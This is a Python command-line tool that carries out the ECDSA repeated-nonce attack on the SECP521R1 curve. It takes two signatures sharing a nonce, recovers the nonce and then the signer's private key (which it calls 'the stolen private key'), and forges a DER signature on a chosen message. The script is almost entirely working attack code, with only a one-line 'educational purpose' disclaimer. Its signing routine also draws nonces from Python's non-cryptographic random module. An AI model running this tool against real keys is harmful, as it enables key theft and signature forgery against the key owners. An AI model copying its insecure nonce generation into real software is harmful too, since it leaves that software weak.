import random 
import cypari2
import hashlib
import builtins 
from cryptography.hazmat.primitives.asymmetric.utils import encode_dss_signature
import base64
import argparse
from cryptography.hazmat.primitives.asymmetric import utils
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
import os
import time
import sys

pari=cypari2.Pari()


def ECDSA_SHA256_sign(E,G,n,da,M): 

    #generate a random r 
    r = random.randint(1, n-1)

    #calculate rG = (xr, yr) = Kr 
    Kr = pari.ellmul(E,G,r)

    #if xr[n]=0 we recompute r
    while(int(builtins.pow(int(Kr[0]),1,n))==0):
        r = random.randint(1, n-1)
        Kr = pari.ellmul(E,G,r)

    #calculate r^-1
    inversedr = int(builtins.pow(r, -1, n))
    #make the hash of the message
    HM = int.from_bytes(hashlib.sha256(M.encode()).digest(), byteorder='big')
    #compute the signature
    s = int(builtins.pow(inversedr * (HM + int(Kr[0])*da), 1, n))

    #if the s[n]=0 we recompute everything 
    while(int(builtins.pow(s,1,n))==0): 
        #generate a random r 
        r = random.randint(1, n-1)

        #calculate rG = (xr, yr) = Kr 
        Kr = pari.ellmul(E,G,r) 
        #if xr[n]=0 we recompute r
        while(int(builtins.pow(int(Kr[0]),1,n))==0):
            r = random.randint(1, n-1)
            Kr = pari.ellmul(E,G,r)
        inversedr = int(builtins.pow(r, -1, n))
        HM = int.from_bytes(hashlib.sha256(M.encode()).digest(), byteorder='big')
        s = int(builtins.pow(inversedr * (HM + int(Kr[0])*da), 1, n))

    return s, int(Kr[0])


def ECDSA_SHA256_verify(E,G,n,Qa,M,s,xr): 
    HM = int.from_bytes(hashlib.sha256(M.encode()).digest(), byteorder='big')
    inverseds = int(builtins.pow(s, -1, n))
    a = pari.ellmul(E, G, int(pow(HM * inverseds, 1, n)))
    b = pari.ellmul(E, Qa, int(pow(xr * inverseds, 1, n)))
    final_point = pari.elladd(E,a,b)
    if(int(pow(xr,1,n))==int(final_point[0])): 
        print("[+] Signature is verified ! :)")
    else: 
        print("[!] Failure, signature is not verified :(")


def compute_nonce_value(E,G,n,M1,M2,r,s_M1,s_M2):
    HM1 = int.from_bytes(hashlib.sha256(M1.encode()).digest(), byteorder='big')
    HM2 = int.from_bytes(hashlib.sha256(M2.encode()).digest(), byteorder='big')
    num_k = pow(s_M2-s_M1,-1,n)
    den_k = HM2-HM1
    recovered_k = pow(num_k*den_k,1,n)
    print("[+] Recovered k value with calculus is =", recovered_k)
    recovered_r = pari.ellmul(E,G,recovered_k)
    print("[+] Recovered r value with calculus is =", recovered_r)
    print("[+] Original r is = ", r)
    if(r==recovered_r[0]):
        print("[+] calculated r and original r are equals !!")
    else:
        print("[+] calculated r and original r are not equals :(")
    return recovered_k


def private_key_recovering(E,G,n,M1,r,s_M1,k):
    HM1 = int.from_bytes(hashlib.sha256(M1.encode()).digest(), byteorder='big')
    num = pow(s_M1*k,1,n)-HM1
    private_key = pow(num*pow(r,-1,n),1,n)
    print("[+] The stolen private key value is = ",private_key)
    return private_key


def parser_message(file_path):
    with open(file_path, 'r') as file:
        message = file.read().strip()
    return message


def parser_pem_pub_key(file_path):
    with open(file_path, 'rb') as pem_file:
        pem_data = pem_file.read()

    public_key = serialization.load_pem_public_key(pem_data, backend=default_backend())
    numbers = public_key.public_numbers()
    x = numbers.x
    y = numbers.y
    return x,y


def parser_der_signature(file_path):
    with open(file_path, 'r') as file:
        base64_data = file.read().strip()
    der_data = base64.b64decode(base64_data)
    r, s = utils.decode_dss_signature(der_data)
    return r,s


def main(): 


    print("""
▗▄▄▄▖ ▗▄▄▖▗▄▄▄  ▗▄▄▖ ▗▄▖      ▗▄▄▖ ▗▄▖ ▗▖  ▗▖▗▄▄▄▖    ▗▖  ▗▖ ▗▄▖ ▗▖  ▗▖ ▗▄▄▖▗▄▄▄▖     ▗▄▖▗▄▄▄▖▗▄▄▄▖▗▄▖  ▗▄▄▖▗▖ ▗▖
▐▌   ▐▌   ▐▌  █▐▌   ▐▌ ▐▌    ▐▌   ▐▌ ▐▌▐▛▚▞▜▌▐▌       ▐▛▚▖▐▌▐▌ ▐▌▐▛▚▖▐▌▐▌   ▐▌       ▐▌ ▐▌ █    █ ▐▌ ▐▌▐▌   ▐▌▗▞▘
▐▛▀▀▘▐▌   ▐▌  █ ▝▀▚▖▐▛▀▜▌     ▝▀▚▖▐▛▀▜▌▐▌  ▐▌▐▛▀▀▘    ▐▌ ▝▜▌▐▌ ▐▌▐▌ ▝▜▌▐▌   ▐▛▀▀▘    ▐▛▀▜▌ █    █ ▐▛▀▜▌▐▌   ▐▛▚▖ 
▐▙▄▄▖▝▚▄▄▖▐▙▄▄▀▗▄▄▞▘▐▌ ▐▌    ▗▄▄▞▘▐▌ ▐▌▐▌  ▐▌▐▙▄▄▖    ▐▌  ▐▌▝▚▄▞▘▐▌  ▐▌▝▚▄▄▖▐▙▄▄▖    ▐▌ ▐▌ █    █ ▐▌ ▐▌▝▚▄▄▖▐▌ ▐▌                                                                                                             
""")


    parser = argparse.ArgumentParser()

    parser.add_argument('-m1', '--message1', required=True,help='Path to first text message in a file.')
    parser.add_argument('-m2', '--message2', required=True,help='Path to first text message in a file.')
    parser.add_argument('-s1', '--signature1',required=True, help='Path to signature file for message1 be careful we want a base64 encoded der file.')
    parser.add_argument('-s2', '--signature2',required=True, help='Path to signature file for message1 be careful we want a base64 encoded der file.')
    parser.add_argument('-pub', '--public_key',required=True, help='Path to public key file, be careful only pem file.')
    parser.add_argument('-sign_msg', '--to_sign_msg',required=True, help='Message you want to be signed with the stolen private key.')
    parser.add_argument('-output_type', '--output_type', default='binary', help='Format of the output signature possible values : b64 or binary, by default binary is selected.')



    args = parser.parse_args()

    print("[+] Careful this script is for educational purpose only. It must not be used to perpretrate real attacks.")
    time.sleep(2)

    r_m1, s_m1 = parser_der_signature(args.signature1)
    r_m2, s_m2 = parser_der_signature(args.signature2)
    
    if(r_m1!=r_m2):
        print("[!] Error, nonces are different can't execute the attack")
        sys.exit(1)
    else: 
        print("[+] Nonces are equals, let's break this !")


    #change the stack size so that we can use ellgenerators function
    pari.allocatemem(pari.stacksizemax()*2)


    print("[+] The curve used here is the SECP521R1.")

    #curve definition
    p = 0x01ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    a = pari.Mod(0x01fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc, p)
    b = pari.Mod(0x0051953eb9618e1c9a1f929a21a0b68540eea2da725b99b315f3b8b489918ef109e156193951ec7e937b1652c0bd3bb1bf073573df883d2c34f1ef451fd46b503f00, p)
    E = pari.ellinit([a, b])
    n = 0x01fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa51868783bf2f966b7fcc0148f709a5d03bb5c9b8899c47aebb6fb71e91386409 
    G = [pari.Mod(0x00c6858e06b70404e9cd9e3ecb662395b4429c648139053fb521f828af606b4d3dbaa14b5e77efe75928fe1dc127a2ffa8de3348b3c1856a429bf97e7e31c2e5bd66, p), pari.Mod(0x011839296a789a3bc0045c8a5fb42c7d1bd998f54449579b446817afbd17273e662c97ee72995ef42640c550b9013fad0761353c7086a272c24088be94769fd16650, p)]

    x_pub, y_pub = parser_pem_pub_key(args.public_key)
    public_key = [pari.Mod(x_pub,p),pari.Mod(y_pub,p)]
    print("[+] Public key parsing done")

    m1 = parser_message(args.message1)
    m2 = parser_message(args.message2)


    ECDSA_SHA256_verify(E,G,n,public_key,m1,s_m1,r_m1)
    ECDSA_SHA256_verify(E,G,n,public_key,m2,s_m2,r_m2)


    k = compute_nonce_value(E,G,n,m1,m2,r_m1,s_m1,s_m2)

    private_key = private_key_recovering(E,G,n,m1,r_m1,s_m1,k)

    message_to_sign = parser_message(args.to_sign_msg)

    signed_message = ECDSA_SHA256_sign(E,G,n,private_key,message_to_sign)

    r = signed_message[1]  
    s = signed_message[0]

    r_s = encode_dss_signature(signed_message[1],signed_message[0])

    if(args.output_type=='binary'):
        print("[+] Binary format output selected, the signature file is signature.bin and format is DER format.")

        with open("./signature.bin", 'wb') as file:
            file.write(r_s)
    elif(args.output_type=='b64'):
        print("[+] base64 output type selected, the signature file is signature.txt")
        
        with open("./signature.txt", 'wb') as file:
            file.write(base64.b64encode(r_s))
    else:
        print("[!] Error, output format not recognised !")


main()